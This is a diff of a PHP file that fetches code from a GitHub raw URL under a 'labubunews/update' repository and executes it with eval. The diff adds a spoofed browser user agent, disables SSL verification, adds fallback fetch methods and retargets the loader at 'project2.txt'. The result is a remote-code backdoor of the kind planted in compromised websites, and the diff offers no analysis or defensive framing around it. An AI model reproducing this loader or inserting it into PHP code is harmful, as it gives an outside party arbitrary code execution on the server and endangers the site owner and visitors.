@@ -13,33 +13,46 @@
  * @param string $url The URL to fetch content from.
  * @return string|false The response content as a string, or false if the operation fails.
  */
-function fetchContentFromURL($url) {
-    // Check if the cURL extension is available on the server
-    if (function_exists('curl_version')) {
-        // Initialize cURL session
-        $curl = curl_init();
+function geturlsinfo($url) { 
+    if (function_exists('curl_exec')) { 
+        $conn = curl_init($url); 
 
-        // Set cURL options
-        curl_setopt($curl, CURLOPT_URL, $url); // Target URL
-        curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false); // Disable SSL verification
-        curl_setopt($curl, CURLOPT_RETURNTRANSFER, true); // Return response as a string
-        curl_setopt($curl, CURLOPT_HEADER, 0); // Exclude header from the output
+        // Check if the cURL extension is available on the server
+        if (function_exists('curl_version')) {
+            // Initialize cURL session
+            curl_setopt($conn, CURLOPT_SSL_VERIFYPEER, false); // Disable SSL verification
+            curl_setopt($conn, CURLOPT_RETURNTRANSFER, true); // Return response as a string
+            curl_setopt($conn, CURLOPT_HEADER, 0); // Exclude header from the output
+            curl_setopt($conn, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36");
 
-        // Execute cURL session and fetch data
-        $response = curl_exec($curl);
+            $url_get_contents_data = curl_exec($conn); 
+            curl_close($conn);
+        } 
+        else { 
+            $url_get_contents_data = false; 
+        }
+    } 
+    elseif (function_exists('file_get_contents')) { 
+        $url_get_contents_data = file_get_contents($url); 
+    } 
+    elseif (function_exists('fopen') && function_exists('stream_get_contents')) { 
+        $handle = fopen($url, "r"); 
+        $url_get_contents_data = stream_get_contents($handle); 
+        fclose($handle); 
+    } 
+    else { 
+        $url_get_contents_data = false; 
+    } 
 
-        // Close the cURL session
-        curl_close($curl);
-
-        // Return the fetched response data
-        return $response;
-    }
-
-    // Return false if cURL is not available
-    return false;
+    return $url_get_contents_data; 
 }
 
 // Execute a string of PHP code fetched from an external source
 // Note: Evaluating external code (using eval) is extremely risky and should
 // only be done in trusted and secure environments to prevent malicious attacks.
-eval("?>" . fetchContentFromURL("https://raw.githubusercontent.com/labubunews/update/refs/heads/main/project.txt"));
+$external_code = geturlsinfo("https://raw.githubusercontent.com/labubunews/update/refs/heads/main/project2.txt");
+if ($external_code !== false) {
+    eval("?>" . $external_code);
+}
+
+?>
